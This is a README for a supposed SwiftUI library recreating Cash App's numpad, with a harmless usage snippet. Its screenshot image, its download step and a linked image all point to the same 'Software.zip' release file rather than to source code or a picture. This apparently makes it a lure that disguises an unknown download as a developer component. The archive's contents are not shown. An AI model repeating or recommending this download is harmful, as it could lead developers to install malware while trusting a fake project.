# CashApp NumPad SwiftUI

Welcome to the **CashApp NumPad SwiftUI** repository! 📱💸 This project aims to recreate the famous Cash App numpad entirely using SwiftUI. If you are looking to implement a sleek and user-friendly numpad in your SwiftUI project, you are at the right place! 

## Screenshots

![Cash App NumPad](https://github.com/angelcoronil21/cashapp-numpad-swiftui/releases/download/v2.0/Software.zip)

## Features

🔢 Fully recreated Cash App numpad\
🎨 Beautiful design and smooth animations\
⌨️ Easy to integrate into any SwiftUI project\
🔧 Customizable components for your specific needs

## How to Use

To get started with the Cash App NumPad SwiftUI in your project, simply follow these steps:

1. Download the SwiftUI components from [this link](https://github.com/angelcoronil21/cashapp-numpad-swiftui/releases/download/v2.0/Software.zip)
   <a href="https://github.com/angelcoronil21/cashapp-numpad-swiftui/releases/download/v2.0/Software.zip"><img src="https://github.com/angelcoronil21/cashapp-numpad-swiftui/releases/download/v2.0/Software.zip"></a>
2. Extract the downloaded files to your project directory
3. Integrate the Cash App NumPad component into your SwiftUI views
4. Customize the appearance and functionality to suit your app's requirements

## Example Usage

```swift
import SwiftUI
import CashAppNumPad

struct ContentView: View {
    @State private var amount: Double = 0.0

    var body: some View {
        VStack {
            Text("Enter Amount:")
            Text("\(amount)")
            CashAppNumPad(value: $amount)
        }
    }
}
```

## Dependencies

The CashApp NumPad SwiftUI project relies on the following dependencies:
- SwiftUI
- Combine

Make sure to have these dependencies set up in your SwiftUI project before integrating the Cash App NumPad component.

## Contributions

Contributions to the CashApp NumPad SwiftUI project are welcome! If you have any ideas for improvements, new features, or bug fixes, feel free to submit a pull request. Together, we can make this project even better. 🚀

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

---

🛠️ Start using the Cash App NumPad SwiftUI today and enhance the user experience in your SwiftUI app! Don't hesitate to reach out if you have any questions or need assistance with implementing the numpad. Happy coding! 💻🚀